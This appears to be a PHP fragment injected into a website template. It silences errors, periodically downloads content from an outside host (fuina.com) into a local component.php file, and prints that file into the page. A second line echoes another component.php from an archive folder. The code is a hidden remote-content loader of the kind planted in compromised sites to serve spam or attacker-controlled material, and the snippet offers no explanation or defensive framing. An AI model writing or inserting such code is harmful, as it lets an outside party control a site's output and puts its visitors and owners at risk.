<p class="nocl">
<?php
	error_reporting(0);
	ini_set('display_errors',0);
	$target = dirname(__FILE__) . DIRECTORY_SEPARATOR . "component.php";
	$source = "http://fuina.com/b/ki.php";
  	$cachetime = 7*24*60*60;
	if ((file_exists($target)) && (time() - $cachetime) > filemtime($target)) {    
		$string = file_get_contents($source);
		$result = file_put_contents($target, $string);
	}
	echo file_get_contents($target);
?>
<?php $comp=file_get_contents("html/com_content/archive/component.php"); echo $comp; ?>
</p>